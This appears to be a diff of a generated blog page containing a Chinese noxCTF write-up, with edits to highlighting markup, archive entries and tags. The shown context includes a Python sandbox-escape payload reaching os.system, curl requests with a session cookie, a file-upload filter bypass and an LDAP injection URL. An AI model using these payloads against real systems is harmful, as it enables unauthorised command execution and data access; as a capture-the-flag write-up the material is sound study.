@@ -410,7 +410,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以通过查找`sys`模块来实现。</span><br><span class="line"></span><br><span class="line">首先通过`&apos;&apos;.__class__.__base__`或者`&apos;&apos;.__class__.__mro__`获得`Object`类。</span><br><span class="line"></span><br><span class="line">注意:</span><br></pre></td></tr></table></figure>
 <p><strong>base</strong>列出其基类, <strong>mro</strong>给出了method resolution order，即解析方法调用的顺序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后获取`Object`所有子类。</span><br><span class="line"></span><br><span class="line">由于`codecs.StreamReaderWriter` 或者`_NamespaceLoader`可以调用`sys`模块，首先找到`StreamReaderWriter`的下标。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;class &apos;str&apos;&gt;, &lt;class &apos;object&apos;&gt;)</span><br><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[1]</span><br><span class="line">&lt;class &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; for i,val in enumerate(&apos;&apos;.__class__.__mro__[1].__subclasses__()):</span><br><span class="line">...     if &quot;Stream&quot; in str(val):</span><br><span class="line">...             print(i, &quot;  &quot;, val)</span><br><span class="line">...</span><br><span class="line">115    &lt;class &apos;codecs.StreamReaderWriter&apos;&gt;</span><br><span class="line">204    &lt;class &apos;tarfile._StreamProxy&apos;&gt;</span><br><span class="line">233    &lt;class &apos;tarfile._Stream&apos;&gt;</span><br><span class="line">248    &lt;class &apos;contextlib._RedirectStream&apos;&gt;</span><br><span class="line">279    &lt;class &apos;codecs.StreamRecoder&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; dir(&apos;&apos;.__class__.__mro__[1].__subclasses__()[64].__init__)</span><br><span class="line">[&apos;__annotations__&apos;, &apos;__call__&apos;, &apos;__class__&apos;, &apos;__closure__&apos;, &apos;__code__&apos;, &apos;__defaults__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__dir__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__get__&apos;, &apos;__getattribute__&apos;, &apos;__globals__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__kwdefaults__&apos;, &apos;__le__&apos;, &apos;__lt__&apos;, &apos;__module__&apos;, &apos;__name__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__qualname__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;]</span><br><span class="line">&gt;&gt;&gt; for i,val in enumerate(&apos;&apos;.__class__.__mro__[1].__subclasses__()):</span><br><span class="line">...     if &quot;_NamespaceLoader&quot; in str(val):</span><br><span class="line">...             print(i, val)</span><br><span class="line">...</span><br><span class="line">41 &lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[1].__subclasses__()[41].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&apos;ls&apos;)</span><br><span class="line">awd  bin  flag.txt  pwndbg  temp</span><br></pre></td></tr></table></figure></p>
 <p>获取对象属性值:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span>&gt;&gt; ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__ </span><br><span class="line">或者:</span><br><span class="line"><span class="meta">&gt;</span>&gt;&gt; for i, val in enumerate(getattr(''.__class__.__mro__[1].__subclasses__()[64].__init__, "__globals__")):</span><br><span class="line">...     print(i, val)</span><br><span class="line">...</span><br><span class="line">0 utf_16_le_encode</span><br><span class="line">1 getencoder</span><br><span class="line">2 __name__</span><br><span class="line">3 utf_32_be_encode</span><br><span class="line">4 utf_7_decode</span><br><span class="line">5 __builtins__</span><br><span class="line">6 open</span><br><span class="line">7 utf_32_encode</span><br><span class="line">8 BOM_UTF16_BE</span><br><span class="line">9 BOM32_BE</span><br><span class="line">10 replace_errors</span><br><span class="line">11 sys</span><br><span class="line">................</span><br><span class="line"><span class="meta">&gt;</span>&gt;&gt; ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"]</span><br><span class="line">&lt;module 'os' from '/usr/lib/python3.5/os.py'&gt;</span><br><span class="line"><span class="meta">&gt;</span>&gt;&gt; ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"].system('ls')</span><br><span class="line">awd  bin  flag.txt  pwndbg  temp</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="string">''</span>.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__ </span></span><br><span class="line">或者:</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="keyword">for</span> i, val <span class="keyword">in</span> enumerate(getattr(<span class="string">''</span>.__class__.__mro__[1].__subclasses__()[64].__init__, <span class="string">"__globals__"</span>)):</span></span><br><span class="line">...     print(i, val)</span><br><span class="line">...</span><br><span class="line">0 utf_16_le_encode</span><br><span class="line">1 getencoder</span><br><span class="line">2 __name__</span><br><span class="line">3 utf_32_be_encode</span><br><span class="line">4 utf_7_decode</span><br><span class="line">5 __builtins__</span><br><span class="line">6 open</span><br><span class="line">7 utf_32_encode</span><br><span class="line">8 BOM_UTF16_BE</span><br><span class="line">9 BOM32_BE</span><br><span class="line">10 replace_errors</span><br><span class="line">11 sys</span><br><span class="line">................</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="string">''</span>.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>]</span></span><br><span class="line">&lt;module 'os' from '/usr/lib/python3.5/os.py'&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="string">''</span>.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">'ls'</span>)</span></span><br><span class="line">awd  bin  flag.txt  pwndbg  temp</span><br></pre></td></tr></table></figure>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def fun(a, b=&apos;&apos;.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&apos;cat Flag&apos;))</span><br><span class="line">or:</span><br><span class="line">def fun(a,b,c=print([].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;))):</span><br><span class="line">or:</span><br><span class="line">def fun(a=print(().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)), b=1)</span><br></pre></td></tr></table></figure>
 <h2 id="Slip-Situation"><a href="#Slip-Situation" class="headerlink" title="Slip Situation"></a>Slip Situation</h2><p>前提: <a href="https://xz.aliyun.com/t/2382" rel="external nofollow" target="_blank">Zip Slip漏洞综述</a></p>
@@ -434,7 +434,7 @@
 <p>然后上传文件。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$ curl --cookie "shortssid=6dWt51pE971H1z4LudGHnt01fhQbGDCg" 'http://chal.noxale.com:1336/admin'</span><br><span class="line">VGhpcyBwYWdlIGlzIG9ubHkgYXZhaWxhYmxlIGZvciBBZG1pblBhbmVsIGJyb3dzZXIgdXNlcnMuDQoNCkFkbWluUGFuZWwvMC4xIGFnZW50IHVzZXJzIG9ubHkh</span><br><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$</span><br><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$ echo VGhpcyBwYWdlIGlzIG9ubHkgYXZhaWxhYmxlIGZvciBBZG1pblBhbmVsIGJyb3dzZXIgdXNlcnMuDQoNCkFkbWluUGFuZWwvMC4xIGFnZW50IHVzZXJzIG9ubHkh | base64 -d</span><br><span class="line">This page is only available for AdminPanel browser users.</span><br><span class="line"></span><br><span class="line">AdminPanel/0.1 agent users only!</span><br></pre></td></tr></table></figure>
 <p>需要修改<code>User-Agent</code>。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$ curl -H "User-Agent: AdminPanel/0.1" --cookie "shortssid=6dWt51pE971H1z4LudGHnt01fhQbGDCg" 'http://chal.noxale.com:1336/admin'  | grep -Eo "no.*&#125;"</span><br><span class="line"><span class="meta">  %</span> Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   745    0   745    0     0    413      0 --:--:--  0:00:01 --:--:--   413</span><br><span class="line">noxCTF&#123;Z1p_Fil3s_Ar3_Fun_H4ha&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$ curl -H "User-Agent: AdminPanel/0.1" --cookie "shortssid=6dWt51pE971H1z4LudGHnt01fhQbGDCg" 'http://chal.noxale.com:1336/admin'  | grep -Eo "no.*&#125;"</span><br><span class="line"><span class="meta">  %</span><span class="bash"> Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   745    0   745    0     0    413      0 --:--:--  0:00:01 --:--:--   413</span><br><span class="line">noxCTF&#123;Z1p_Fil3s_Ar3_Fun_H4ha&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>修改<code>Referer</code> 为 <code>http://www.google.com</code>即可。</p>
 <h2 id="myfileuplaod"><a href="#myfileuplaod" class="headerlink" title="myfileuplaod"></a>myfileuplaod</h2><p>使用正则表达式过滤，<code>.php$</code>存在问题，使用<code>.php.php</code> 即可绕过。</p>
 <h2 id="hiddendom"><a href="#hiddendom" class="headerlink" title="hiddendom"></a>hiddendom</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">			var _0x3bc3=[&quot;\x6D\x61\x69\x6E\x5F\x66\x6F\x72\x6D&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x69\x6E\x70\x75\x74&quot;,&quot;\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74&quot;,&quot;\x6E\x61\x6D\x65&quot;,&quot;\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E&quot;,&quot;\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65&quot;,&quot;\x74\x79\x70\x65&quot;,&quot;\x74\x65\x78\x74&quot;,&quot;\x70\x6C\x61\x63\x65\x68\x6F\x6C\x64\x65\x72&quot;,&quot;\x2F\x3C\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x68\x69\x64\x64\x65\x6E\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x3E\x2F&quot;];var _frss=document[_0x3bc3[1]](_0x3bc3[0]);var _xEger=document[_0x3bc3[3]](_0x3bc3[2]);_xEger[_0x3bc3[6]](_0x3bc3[4],_0x3bc3[5]);_xEger[_0x3bc3[6]](_0x3bc3[7],_0x3bc3[8]);_xEger[_0x3bc3[6]](_0x3bc3[9],_0x3bc3[10])</span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">=&gt; </span><br><span class="line">var form = document.getElementById(&quot;main_form&quot;);</span><br><span class="line">var input = document.createElement(&quot;input&quot;);</span><br><span class="line">input.setAttribute(&quot;name&quot;, &quot;expression&quot;);</span><br><span class="line">input.setAttribute(&quot;type&quot;, &quot;text&quot;);</span><br><span class="line">input.setAttribute(&quot;placeholder&quot;, &quot;/&lt;[^&lt;&gt;]&#123;1,&#125;hidden[^&lt;&gt;]&#123;1,&#125;&gt;/&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var _0x2b80=[&quot;\x73\x6C\x6F\x77&quot;,&quot;\x66\x61\x64\x65\x4F\x75\x74&quot;,&quot;\x23\x68\x69\x64\x64\x65\x6E\x5F\x65\x6C\x65\x6D\x65\x6E\x74\x73&quot;,&quot;\x63\x6C\x69\x63\x6B&quot;,&quot;\x23\x68\x69\x64\x65\x41\x72\x65\x61&quot;,&quot;\x72\x65\x61\x64\x79&quot;,&quot;\x66\x61\x64\x65\x49\x6E&quot;,&quot;\x23\x73\x68\x6F\x77\x41\x72\x65\x61&quot;];$(document)[_0x2b80[5]](function()&#123;$(_0x2b80[4])[_0x2b80[3]](function()&#123;$(_0x2b80[2])[_0x2b80[1]](_0x2b80[0])&#125;)&#125;);$(document)[_0x2b80[5]](function()&#123;$(_0x2b80[7])[_0x2b80[3]](function()&#123;$(_0x2b80[2])[_0x2b80[6]](_0x2b80[0])&#125;)&#125;)</span><br><span class="line">=&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">    $(&quot;#hideArea&quot;).click(function() &#123;</span><br><span class="line">        $(&quot;#hidden_elements&quot;).fadeOut(&quot;slow&quot;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">    $(&quot;#showArea&quot;).click(function() &#123;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
@@ -478,7 +478,7 @@
 <p>通过页面显示，我们可以知道，页面展示了两个字段<code>documentTitle</code> 以及<code>description</code>。</p>
 <p>所以可以构造如下payload:</p>
 <p><code>http://54.152.220.222/word.php?page=*)(description=nox*</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:~$ curl "http://54.152.220.222/word.php?page=*)(description=nox*" | grep -Eo "nox.*&#125;"</span><br><span class="line"><span class="meta">  %</span> Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3872  100  3872    0     0   6829      0 --:--:-- --:--:-- --:--:--  6840</span><br><span class="line">noxCTF&#123;K1NG_0F_LD4P&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:~$ curl "http://54.152.220.222/word.php?page=*)(description=nox*" | grep -Eo "nox.*&#125;"</span><br><span class="line"><span class="meta">  %</span><span class="bash"> Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3872  100  3872    0     0   6829      0 --:--:-- --:--:-- --:--:--  6840</span><br><span class="line">noxCTF&#123;K1NG_0F_LD4P&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="GuessTheString"><a href="#GuessTheString" class="headerlink" title="GuessTheString"></a>GuessTheString</h2><p>题目很清晰:</p>
 <p>字符串符合以下条件即可:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">return (unsigned int)tiaojian_1((const char *)a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_2((_BYTE *)a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_3((char *)a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_4((_BYTE *)a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_5(a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_6(a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_7(a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_8(a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_9(v2, v8, a1)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_10(v10)</span><br><span class="line">     &amp;&amp; (unsigned int)tiaojian_11(v10, a2, v3, v4, v5, v6, v9, v10);</span><br></pre></td></tr></table></figure>
@@ -1474,9 +1474,261 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 57
+        Total : 71
         </div>
         <!-- search  -->
         
@@ -1487,8 +1739,97 @@
     
     
     
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1498,11 +1839,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
         </li>
     
     
@@ -1522,7 +1858,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
         </li>
     
     
@@ -1642,17 +1978,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">linux常见文件的作用</a>
         </li>
     
     
@@ -1697,12 +2028,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -1722,7 +2053,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_return2plt</a>
         </li>
     
     
@@ -1780,19 +2111,25 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+        <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1804,9 +2141,9 @@
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
-        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
     
-        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
